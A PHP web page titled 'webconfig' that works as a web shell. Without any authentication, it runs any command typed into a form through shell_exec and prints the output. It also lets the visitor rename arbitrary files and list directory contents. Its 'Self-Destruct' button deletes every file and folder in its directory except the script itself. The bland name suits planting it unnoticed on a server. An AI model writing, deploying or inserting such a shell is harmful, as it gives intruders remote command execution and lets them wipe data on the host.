<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>webconfig</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        h2 {
            color: #333;
        }

        form {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input {
            padding: 8px;
            margin-bottom: 10px;
        }

        button {
            padding: 8px 15px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        ul {
            list-style-type: none;
            padding: 0;
        }

        li {
            margin-bottom: 5px;
        }

        pre {
            white-space: pre-wrap;
        }

        .container {
            max-width: 600px;
            margin: auto;
        }
    </style>
</head>
<body>

<div class="container">
  

    <form method="post">
        <label for="command">Enter command:</label>
        <input type="text" name="command" id="command" required>
        <button type="submit">Execute</button>
    </form>

    <form method="post">
        <button type="submit" name="selfDestruct">Self-Destruct</button>
    </form>

    <form method="post">
        <label for="oldFileName">Old File/Directory Name:</label>
        <input type="text" name="oldFileName" id="oldFileName" required>
        <br>
        <label for="newFileName">New File/Directory Name:</label>
        <input type="text" name="newFileName" id="newFileName" required>
        <br>
        <button type="submit" name="renameFile">Rename File/Directory</button>
    </form>

    <form method="post">
        <button type="submit" name="listFiles">List Files</button>
    </form>

    <form method="post">
        <button type="submit" name="listFolders">List Folders</button>
    </form>

<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Self-Destruct
    if (isset($_POST["selfDestruct"])) {
        $dirPath = __DIR__; // Specify the directory path

        // Perform basic validation on the directory path
        if (is_dir($dirPath) && strpos(realpath($dirPath), realpath(__DIR__)) === 0) {
            // Get the name of the current file
            $currentFileName = basename(__FILE__);

            // Delete all files and folders in the directory except the current file
            $items = glob($dirPath . '/*');
            foreach ($items as $item) {
                if (basename($item) !== $currentFileName) {
                    if (is_file($item)) {
                        unlink($item); // Delete file
                    } elseif (is_dir($item)) {
                        // Delete folder and its contents
                        array_map('unlink', glob("$item/*.*"));
                        rmdir($item);
                    }
                }
            }
            echo "<p>All files and folders in the directory, except the current file, have been deleted.</p>";
        } else {
            echo "<p>Invalid directory path.</p>";
        }
    }

    // Rename File/Directory
    if (isset($_POST["renameFile"])) {
        $oldFileName = $_POST["oldFileName"];
        $newFileName = $_POST["newFileName"];

        if (rename($oldFileName, $newFileName)) {
            echo "<p>File/Directory successfully renamed.</p>";
        } else {
            echo "<p>Error renaming the file/directory.</p>";
        }
    }

    // List Files
    if (isset($_POST["listFiles"])) {
        $dirPath = __DIR__; // Specify the directory path

        // Perform basic validation on the directory path
        if (is_dir($dirPath) && strpos(realpath($dirPath), realpath(__DIR__)) === 0) {
            // Get the list of files in the directory
            $files = glob($dirPath . '/*');
            echo "<h3>Current Files:</h3>";
            echo "<ul>";
            foreach ($files as $file) {
                if (is_file($file)) {
                    echo "<li>$file</li>";
                }
            }
            echo "</ul>";
        } else {
            echo "<p>Invalid directory path.</p>";
        }
    }

    // List Folders
    if (isset($_POST["listFolders"])) {
        $dirPath = __DIR__; // Specify the directory path

        // Perform basic validation on the directory path
        if (is_dir($dirPath) && strpos(realpath($dirPath), realpath(__DIR__)) === 0) {
            // Get the list of folders in the directory
            $folders = glob($dirPath . '/*', GLOB_ONLYDIR);
            echo "<h3>Current Folders:</h3>";
            echo "<ul>";
            foreach ($folders as $folder) {
                echo "<li>$folder</li>";
            }
            echo "</ul>";
        } else {
            echo "<p>Invalid directory path.</p>";
        }
    }

    // Execute user-specified command
    if (isset($_POST["command"])) {
    $command = $_POST["command"];
    $output = shell_exec($command);

    if ($output === false) {
        echo "<p>Error executing the command.</p>";
    } else {
        if (empty($output)) {
            echo "Command executed successfully, but there was no output.";
        } else {
            echo "<pre>$output</pre>";
        }
    }
}

}
?>

</div>

</body>
</html>
